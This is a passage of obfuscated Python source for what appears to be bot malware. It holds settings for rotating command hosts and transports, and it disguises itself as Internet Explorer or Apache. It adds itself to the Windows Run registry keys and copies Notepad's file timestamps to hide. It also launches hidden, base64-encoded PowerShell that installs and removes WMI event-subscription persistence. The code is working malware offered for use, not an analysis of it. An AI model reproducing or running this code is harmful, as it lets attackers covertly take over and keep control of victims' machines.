				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy[0]>pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD[0]and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy[1]>pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD[1]:
					self.__current_update_interval=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy
		pass
		return self.__current_update_interval


	@property
	def tick_count(self):
		return min(self.__tick_count,3601)


	@tick_count.setter
	def tick_count(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ):
		if self.tick_count_enabled:
			self.__tick_count=min(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ,3601)
		else:
			self.__tick_count=1
		pass


	@property
	def tick_count_enabled(self):
		if not 'tick_count_enabled' in self.__settings:
			self.__settings['tick_count_enabled']=True
		return self.__settings['tick_count_enabled']


	def set_tick_count_enabled(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ):
		self.__settings['tick_count_enabled']=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ
		self.save()


	def reset_tick_count(self):
		self.__tick_count=1
		self.__tick_count_state=0
		self.__current_update_interval=self.__settings['update_interval']


	def set_update_interval(self,data_start,data_end):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQy=min(data_start,data_end)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQe=max(data_start,data_end)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQe=min(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQe,86400)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQe=max(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQe,3)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQy=max(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQy,1)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ=(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDQe)
		self.__settings['update_interval']=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ
		self.__current_update_interval=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ
		self.save()
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ


	@property
	def frozen(self):
		return getattr(sys,'frozen',False)


	@property
	def cleanup_dirs(self):
		if not 'cleanup_dirs' in self.__settings:
			self.__settings['cleanup_dirs']=[]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye=self.__settings['cleanup_dirs']
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ=getattr(sys,'_MEIPASS',None)
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye=[]
			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ in self.__settings['cleanup_dirs']:
				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ!=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye


	def add_cleanup_dir(self,path):
		if not 'cleanup_dirs' in self.__settings:
			self.__settings['cleanup_dirs']=[]
		if path:
			self.__settings['cleanup_dirs'].append(path)
			self.save()


	def change_host(self):
		botKlass.is_first_request=True
		if self.__current_host_index<len(self.__settings['host_scripts'])-1:
			self.__current_host_index+=1
		else:
			self.__current_host_index=0


	def change_transport(self):
		botKlass.is_first_request=True
		if self.__current_transport_index<len(self.__transports)-1:
			self.__current_transport_index+=1
		else:
			self.__current_transport_index=0


	@property
	def self_dir(self):
		if self.frozen:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye=os_path.dirname(os_path.abspath(sys_executable))
		elif __file__:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye=os_path.dirname(os_path.abspath(__file__))
		else:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye=tempfile_gettempdir()
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye


	@property
	def referer(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi=self.__settings.get('referer')
		if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi=bot_settings.get('referer')
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi


	@referer.setter
	def referer(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		self.__settings['referer']=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


	@property
	def is_first_request(self):
		return self.__is_first_request


	@is_first_request.setter
	def is_first_request(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		self.__is_first_request=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


	@property
	def enable_autoload(self):
		return bot_settings.get('enable_autoload',False)


	@property
	def registered_settings(self):
		return self.__settings['registered_settings']


	@registered_settings.setter
	def registered_settings(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		self.__settings['registered_settings']=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy
		self.save()


	@property
	def autoload_settings(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQey={'exe_name':'iexplore.exe','app_name':'Internet Explorer','self_delete':False}
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQei={'exe_name':'httpd','app_name':'Apache','self_delete':False}
		if v_sys_platform=='win32':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQiy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQey
		else:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQiy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQei
		return bot_settings.get('autoload_settings',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQiy)


	@property
	def autoload_registered(self):
		return self.__settings.get('registered_settings',None)


	@property
	def was_first_run(self):
		return self.__settings.get('was_first_run',False)


	@was_first_run.setter
	def was_first_run(self,val):
		self.__settings['was_first_run']=val
		self.save()


	@property
	def run_delay(self):
		if len(sys_argv)>1:
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQie=int(sys_argv[1])
				return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQie
			except:
				pass
		if not botKlass.was_first_run:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQie=bot_settings.get('first_run_delay',1)
			return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQie
		return 0


	@property
	def broker_key(self):
		return self.__broker_key


	def set_broker_key(self,data):
		first_char=data[0]
		random_string=ord(data[1])^ord(first_char)
		self.__broker_key=data[random_string+2:]


	@property
	def user_agent(self):
		user_agent=self.__settings.get('user_agent','')
		if not user_agent:
			user_agent='Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
		return user_agent


	def set_user_agent(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		self.__settings['user_agent']=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


	def get_all_settings(self):
		return self.__settings


	def update_settings(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		self.__settings.update(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
		self.save()


botKlass=BotKlass()


class RegPersistenceKlass(object):

	def __init__(self):
		self.autostart_targ=r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'


	def enum_key(self,aReg,targ,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('bits',32)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQi=_winreg.KEY_WOW64_32KEY
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe==64:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQi=_winreg.KEY_WOW64_64KEY
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ=[]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei=_winreg.OpenKey(aReg,targ,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQi|_winreg.KEY_READ)
		for i in range(137):
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ={}
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ['name'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ['data'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyiQ=_winreg.EnumValue(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei,i)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ)
			except Exception:
				break
			finally:
				_winreg.CloseKey(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ


	def add_value(self,aReg,targ,value_name,value_data,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('bits',32)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQi=_winreg.KEY_WOW64_32KEY
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=False
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe==64:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQi=_winreg.KEY_WOW64_64KEY
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei=None
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei=_winreg.OpenKey(aReg,targ,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQi|_winreg.KEY_SET_VALUE)
			_winreg.SetValueEx(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei,value_name,0,_winreg.REG_SZ,value_data)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=True
		finally:
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei:
				_winreg.CloseKey(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


	def del_value(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,targ,value_name,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=False
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei=None
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei=_winreg.OpenKey(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,targ,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe|_winreg.KEY_SET_VALUE)
			_winreg.DeleteValue(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei,value_name)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=True
		finally:
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei:
				_winreg.CloseKey(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyei)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


	def add_autostart(self,value_name,value_data):
		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe in[32]:
			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy in(HKLM,HKCU):
				try:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.add_value(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,self.autostart_targ,value_name,value_data)
					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
						return{'reg_type':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,'targ':self.autostart_targ,'value_name':value_name,'value_data':value_data,'bits':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe}
				except:
					pass


	def enum_autostart(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ=[]
		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe in[32]:
			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy in(HKLM,HKCU):
				try:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.enum_key(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,self.autostart_targ,bits=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe)
					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
				except:
					pass
		return list(itertools_chain.from_iterable(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ))


class pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQyDe(ctypes.Structure):
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQi=[("low",ctypes.c_ulong),("high",ctypes.c_ulong),]
	def __lt__(self,other):
		if self.high>other.high:
			return True
		if self.high<other.high:
			return False
		if self.low>other.low:
			return True
		return False


class BotActionsKlass(object):

	def __init__(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		self.app_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ
		self.exe_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi
		self.exe_path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('exe_path',None)
		self.win_dir=self.get_win_folder(36)
		self.local_appdata_dir=self.get_win_folder(0x1C)
		self.startup_dir=self.get_win_folder(7)


	@staticmethod
	def __delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDzi):
		try:
			os_remove(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDzi)
		except:
			pass


	@staticmethod
	def b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		return base64_b64encode("\0".join([i for i in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy])+'\0')


	def copy_and_clone_time(self,directory,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi):
		if self.exe_path:
			return self.exe_path
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy=self.copy_self(directory,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi)
		self.clone_notepad_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy


	def pshell_bind_trigger(self,filepath):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy="$filterName=\"{0}\";$consumerName=\"{1}\";$exePath=\"{2}\";"
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe="JFF1ZXJ5PSJTRUxFQ1QgKiBGUk9NIF9fSW5zdGFuY2VNb2RpZmljYXRpb25FdmVudCBXSVRISU4gNjAgV0hFUkUgVGFyZ2V0SW5zdGFuY2UgSVNBICdXaW4zMl9QZXJmRm9ybWF0dGVkRGF0YV9QZXJmT1NfU3lzdGVtJyBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lID49IDIwMCBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lIDwgMzIwIgp0cnl7JFdNSUV2ZW50RmlsdGVyPVNldC1XbWlJbnN0YW5jZSAtQ2xhc3MgX19FdmVudEZpbHRlciAtTmFtZVNwYWNlICJyb290XHN1YnNjcmlwdGlvbiIgLUFyZ3VtZW50cyBAe05hbWU9JGZpbHRlck5hbWU7RXZlbnROYW1lU3BhY2U9InJvb3RcY2ltdjIiO1F1ZXJ5TGFuZ3VhZ2U9IldRTCI7UXVlcnk9JFF1ZXJ5fSAtRXJyb3JBY3Rpb24gU3RvcAokV01JRXZlbnRDb25zdW1lcj1TZXQtV21pSW5zdGFuY2UgLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtTmFtZXNwYWNlICJyb290XHN1YnNjcmlwdGlvbiIgLUFyZ3VtZW50cyBAe05hbWU9JGNvbnN1bWVyTmFtZTtFeGVjdXRhYmxlUGF0aD0kZXhlUGF0aDtDb21tYW5kTGluZVRlbXBsYXRlPSRleGVQYXRofQpTZXQtV21pSW5zdGFuY2UgLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLU5hbWVzcGFjZSAicm9vdFxzdWJzY3JpcHRpb24iIC1Bcmd1bWVudHMgQHtGaWx0ZXI9JFdNSUV2ZW50RmlsdGVyO0NvbnN1bWVyPSRXTUlFdmVudENvbnN1bWVyfTtleGl0IDB9Y2F0Y2h7ZXhpdCAtMX0="
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ=self.app_name.replace(' ,.','')+botKlass.bot_id[0:2]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiyQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ+'Filter'+str(random_randint(1,100))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiye=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ+'Consumer'+str(random_randint(1,100))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDieQ=filepath.replace("\\","\\\\")
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiyQ,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiye,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDieQ)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey+=base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei="powershell.exe -windowstyle hidden -enc {0}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=-1
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=subprocess_call(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei,creationflags=0x08000000)
		except Exception as e:
			pass
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiyQ,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiye


	def pshell_unbind_trigger(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy="$filter_name='{0}';$consumer_name='{1}';".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe="R2V0LVdtaU9iamVjdCAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1OYW1lc3BhY2UgInJvb3Rcc3Vic2NyaXB0aW9uIiAtRmlsdGVyICJOYW1lPSckY29uc3VtZXJfbmFtZSciIHwgUmVtb3ZlLVdtaU9iamVjdApHZXQtV21pT2JqZWN0IC1DbGFzcyBfX0V2ZW50RmlsdGVyIC1OYW1lU3BhY2UgInJvb3Rcc3Vic2NyaXB0aW9uIiAtRmlsdGVyICJOYW1lPSckZmlsdGVyX25hbWUnIiB8IFJlbW92ZS1XbWlPYmplY3QKR2V0LVdtaU9iamVjdCAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtTmFtZXNwYWNlICJyb290XHN1YnNjcmlwdGlvbiIgLUZpbHRlciAiRmlsdGVyID0gIiJfX2V2ZW50ZmlsdGVyLm5hbWU9JyRmaWx0ZXJfbmFtZSciIiIgfCBSZW1vdmUtV21pT2JqZWN0"
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy+base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei="powershell.exe -windowstyle hidden -enc {0}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=subprocess_call(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei,creationflags=0x08000000)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD


	@staticmethod
	def get_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQyDe(),pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQyDe(),pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQyDe()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi=ctypes.windll.kernel32.CreateFileW(unicode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD),enum_GEN_READ,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeQi|pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeQD|pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQDi,None,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeiQ,None)
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi==pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeDi:
			return None
		ctypes.windll.kernel32.GetFileTime(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi,ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie),ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe),ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD))
		ctypes.windll.kernel32.CloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi)
